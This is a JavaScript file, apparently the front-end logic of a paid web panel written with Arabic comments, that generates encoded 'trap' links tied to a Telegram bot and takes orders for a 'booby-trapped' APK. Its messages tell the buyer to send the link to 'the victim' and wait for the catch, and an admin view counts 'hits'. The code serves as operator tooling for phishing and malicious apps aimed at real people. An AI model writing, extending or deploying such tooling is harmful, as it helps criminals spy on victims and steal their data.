// --- MATRIX LOGIC ENGINE ---

// 1. توليد الرابط المشفر (The Trap)
function generateMatrixLink() {
    const decoy = document.getElementById('decoy-url').value || "https://youtube.com";
    const botToken = localStorage.getItem('user_bot_token'); // يُفترض إدخاله في قسم البوتات
    const chatId = localStorage.getItem('user_chat_id');
    const myID = localStorage.getItem('m_id_user');
    const credits = parseInt(localStorage.getItem('m_credits') || '0');

    if (!botToken || !chatId) {
        return Swal.fire({
            title: 'إعدادات ناقصة',
            text: 'لازم تروح لقسم بناء التطبيق وتدخل توكن بوت التليجرام والـ ID بتاعك الأول!',
            icon: 'error'
        });
    }

    if (credits > 0) {
        // تشفير البيانات داخل اللينك
        const payload = btoa(JSON.stringify({
            t: botToken,
            i: chatId,
            u: decoy,
            o: myID
        }));

        const finalLink = `${window.location.origin}/r.html?p=${payload}`;

        // خصم نقطة وتحديث السيرفر
        db.ref('users/' + myID + '/credits').transaction((c) => (c || 0) - 1);
        
        // تسجيل العملية في السجل العام
        db.ref('global_hits').push({ type: 'link', owner: myID, time: new Date().toLocaleString() });

        Swal.fire({
            title: 'تم توليد الرابط! 🔥',
            html: `<input type="text" value="${finalLink}" id="gen-url" readonly style="width:100%; padding:10px; background:#222; color:var(--neon); border:1px solid var(--neon); text-align:center;">`,
            confirmButtonText: 'نسخ الرابط'
        }).then(() => {
            const input = document.getElementById('gen-url');
            input.select();
            document.execCommand('copy');
            Swal.fire('تم النسخ', 'الآن أرسله للضحية وانتظر الصيد!', 'success');
        });
    } else {
        paywall();
    }
}

// 2. طلب بناء تطبيق APK
async function requestAPK() {
    const token = document.getElementById('apk-bot').value;
    const cid = document.getElementById('apk-chatid').value;
    const myID = localStorage.getItem('m_id_user');

    if (!token || !cid) return Swal.fire('خطأ', 'دخل بيانات البوت كاملة', 'error');

    // حفظ البيانات محلياً لاستخدامها في اللينكات لاحقاً
    localStorage.setItem('user_bot_token', token);
    localStorage.setItem('user_chat_id', cid);

    Swal.fire({
        title: 'جاري إرسال الطلب...',
        text: 'يتم الآن إرسال بياناتك للأدمن الماستر لتشفير نسخة الـ APK الخاصة بك.',
        icon: 'info',
        showConfirmButton: false,
        timer: 3000
    }).then(() => {
        // تسجيل الطلب في Firebase للأدمن
        db.ref('apk_requests').push({
            userId: myID,
            botToken: token,
            chatId: cid,
            status: 'pending',
            time: new Date().toLocaleString()
        });

        Swal.fire('تم الإرسال ✅', 'سيتم التواصل معك عبر الواتساب لإرسال ملف الـ APK الملغم.', 'success');
    });
}

// 3. تحديث الإحصائيات في لوحة الأدمن (حقيقي)
function loadAdminStats() {
    db.ref('users').on('value', (snap) => {
        document.getElementById('admin-total-users').innerText = snap.numChildren();
    });
    
    // يمكنك إضافة عداد للعمليات الناجحة هنا
    db.ref('hits').on('value', (snap) => {
        // تحديث عداد الصيد الكلي إذا أردت
    });
}
